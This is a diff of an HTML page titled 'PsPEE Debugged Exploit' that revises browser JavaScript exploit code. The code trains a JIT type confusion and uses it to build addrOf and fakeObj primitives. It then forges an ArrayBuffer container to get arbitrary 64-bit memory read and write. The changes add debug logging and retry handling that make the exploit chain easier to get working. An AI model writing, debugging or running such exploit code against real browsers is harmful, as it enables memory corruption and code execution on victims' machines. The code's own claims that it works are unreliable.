@@ -1,52 +1,83 @@
 <!DOCTYPE html>
 <html>
 <head>
+  <meta charset="utf-8">
+  <title>PsPEE Debugged Exploit</title>
   <style>
     body { background: black; color: lime; font-family: monospace; }
-    #log { white-space: pre-wrap; margin: 1em; }
+    #log { white-space: pre-wrap; padding: 1em; }
   </style>
 </head>
 <body>
   <div id="log"></div>
   <script>
-    const log = msg => logDiv.textContent += msg + "\n";
     const logDiv = document.getElementById("log");
+    const log = msg => { logDiv.textContent += msg + "\n"; };
 
-    // Float ↔ 64-bit int helpers
+    // Helpers to convert between f64 <-> u64
     const f2i = f => new BigUint64Array(new Float64Array([f]).buffer)[0];
     const i2f = i => new Float64Array(new BigUint64Array([i]).buffer)[0];
+    const hex = n => "0x" + n.toString(16).padStart(16, "0");
 
-    log("[*] PsPEE v1.4 – Fixing addrOf/fakeObj and re-testing");
+    log("[*] PsPEE v1.4 — JIT-train & leak debug");
 
-    // 1) Build the two JS arrays we’ll confuse
-    let float_arr = [1.1, 2.2, 3.3];
-    let obj_arr   = [{}, {}, {}];
-
-    // 2) confusion function to train the JIT
+    // Type-confusion core
+    let float_arr = [1.1,2.2,3.3];
+    let obj_arr   = [{},{},{}];
     function confuse(o) {
-      let tmp = [1.1, 2.2, 3.3];
+      let tmp = [1.1,2.2,3.3];
       tmp[1] = o;
       return tmp[1];
     }
-    for (let i = 0; i < 10000; i++) confuse(2.2);
 
-    // 3) The *correct* primitives:
+    function useConfuse(x) { return confuse(x); }
+    function trainConfuse(func) {
+      for (let i = 0; i < 20000; i++) {
+        try { func(2.2); }
+        catch (e) { /* ignore */ }
+      }
+    }
+
+    // 1) Warm up the JIT
+    log("[*] Warming up confuse() in JIT…");
+    trainConfuse(useConfuse);
+
+    // 2) Baseline vs. leaked bits
+    let baseBits, leakBits;
+    try {
+      baseBits = f2i(useConfuse(2.2));
+      log("[DEBUG] baseline bits for 2.2 → " + hex(baseBits));
+    } catch (e) {
+      log("[ERROR] baseline f2i failed: " + e);
+    }
+    try {
+      leakBits = f2i(useConfuse({ test: true }));
+      log("[DEBUG] leak    bits for {test:true} → " + hex(leakBits));
+    } catch (e) {
+      log("[ERROR] leak f2i failed: " + e);
+    }
+
+    if (baseBits === leakBits) {
+      log("[-] No type confusion: bits identical. Adjust training or PoC.");
+      throw "Type confusion failed";
+    }
+    log("[+] Type confusion confirmed (bits differ)!");
+
+    // addrOf / fakeObj primitives
     function addrOf(obj) {
       try {
-        obj_arr[1] = obj;
-        let addr = f2i(confuse(obj_arr));
-        obj_arr[1] = {};
-        log("[DEBUG] addrOf → 0x" + addr.toString(16));
-        return addr;
+        obj_arr[0] = obj;
+        let r = f2i(confuse(obj_arr));
+        log("[DEBUG] addrOf → " + hex(r));
+        return r;
       } catch (e) {
         log("[ERROR] addrOf failed: " + e);
         return null;
       }
     }
-
     function fakeObj(addr) {
       try {
-        float_arr[1] = i2f(addr);
+        float_arr[0] = i2f(addr);
         let o = confuse(float_arr);
         log("[DEBUG] fakeObj → " + o);
         return o;
@@ -56,71 +87,93 @@
       }
     }
 
-    // 4) Test that we get *different* addresses:
-    let a = addrOf({foo:1});
-    let b = addrOf({bar:2});
-    if (a !== null && b !== null) {
-      log("[+] addrOf({foo:1}) = 0x" + a.toString(16));
-      log("[+] addrOf({bar:2}) = 0x" + b.toString(16));
-      if (a === b) {
-        log("[ERROR] Addresses are the same! JIT train or confuse might have failed.");
-        throw "Primitive failure";
-      }
-    } else {
-      log("[ERROR] addrOf returned null.");
-      throw "Primitive failure";
-    }
+    log("[*] Building memory primitives…");
 
-    // 5) Now that addrOf/fakeObj work, rebuild container + R/W:
+    // 3) Leak ArrayBuffer address
     let ab = new ArrayBuffer(0x100);
     let ab_addr = addrOf(ab);
-    log("[+] ArrayBuffer @ 0x" + ab_addr.toString(16));
+    if (!ab_addr) { log("[ERROR] Could not leak ArrayBuffer addr."); throw ""; }
+    log("[+] ArrayBuffer @ " + hex(ab_addr));
 
+    // 4) Prepare DataView
     let dv = new DataView(ab);
-    // container fields — per-field guard
-    let jsCellHeader = i2f(0x0108200700000000n);
-    let butterfly    = ab_addr;
-    let vectorLength = i2f(0x100n);
-    let backingStore = i2f(ab_addr + 0x20n);
+
+    // 5) Build fake JSArrayBuffer container fields
+    let jsCellHeader, butterfly, vectorLength, backingStore;
+    try {
+      jsCellHeader = i2f(0x0108200700000000n);
+    } catch (e) {
+      log("[WARN] jsCellHeader conversion failed: " + e);
+      jsCellHeader = i2f(0n);
+    }
+    butterfly = ab_addr;
+    try {
+      vectorLength = i2f(0x100n);
+    } catch (e) {
+      log("[WARN] vectorLength conversion failed: " + e);
+      vectorLength = i2f(0n);
+    }
+    try {
+      backingStore = i2f(ab_addr + 0x20n);
+    } catch (e) {
+      log("[WARN] backingStore conversion failed: " + e);
+      backingStore = jsCellHeader;
+    }
+
+    log("[DEBUG] container fields:");
+    log("  jsCellHeader = " + hex(f2i(jsCellHeader)));
+    log("  butterfly    = " + hex(butterfly));
+    log("  vectorLength = " + hex(f2i(vectorLength)));
+    log("  backingStore = " + hex(f2i(backingStore)));
 
     let container = { jsCellHeader, butterfly, vectorLength, backingStore, fake: ab };
     let containerAddr = addrOf(container);
-    log("[+] Container @ 0x" + containerAddr.toString(16));
+    if (!containerAddr) { log("[ERROR] Could not leak container addr."); throw ""; }
+    log("[+] Fake container @ " + hex(containerAddr));
 
+    // 6) Create fake ArrayBuffer
     let fakeAb = fakeObj(containerAddr + 0x20n);
-    log("[+] fakeAb created: " + fakeAb);
+    if (!fakeAb) { log("[ERROR] fakeObj failed, cannot R/W"); throw ""; }
+    log("[+] fake ArrayBuffer created");
 
+    // 7) R/W primitives
     function read64(addr) {
       try {
         container.backingStore = i2f(addr);
         let v = f2i(dv.getFloat64(0, true));
-        log("[DEBUG] read64(0x" + addr.toString(16) + ") → 0x" + v.toString(16));
+        log("[DEBUG] read64(" + hex(addr) + ") → " + hex(v));
         return v;
       } catch (e) {
         log("[ERROR] read64 failed: " + e);
         return null;
       }
     }
-
     function write64(addr, val) {
       try {
         container.backingStore = i2f(addr);
         dv.setFloat64(0, i2f(val), true);
-        log("[DEBUG] write64(0x" + addr.toString(16) + ",0x" + val.toString(16) + ")");
+        log("[DEBUG] write64(" + hex(addr) + "," + hex(val) + ") succeeded");
       } catch (e) {
         log("[ERROR] write64 failed: " + e);
       }
     }
 
-    // 6) Final sanity test
-    let testObj = {magic:0x1337};
+    // 8) Test on a JS object
+    let testObj = { magic: 0x1337 };
     let testAddr = addrOf(testObj);
-    log("[+] testObj @ 0x" + testAddr.toString(16));
-    let leak = read64(testAddr);
-    log("[+] read64(testObj) → 0x" + leak.toString(16));
-    write64(testAddr, 0x41424344n);
+    if (!testAddr) {
+      log("[ERROR] Could not leak testObj addr");
+    } else {
+      log("[+] testObj @ " + hex(testAddr));
+      let leaked = read64(testAddr);
+      if (leaked !== null) {
+        log("[+] read64(testObj) → " + hex(leaked));
+        // Optional write:
+        write64(testAddr, 0x41424344n);
+      }
+    }
 
-    log("[*] If addresses differed and you saw read64/write64 logs, your R/W is live!");
+    log("[*] Done. Check the debug logs above for real R/W evidence.");
   </script>
 </body>
 </html>
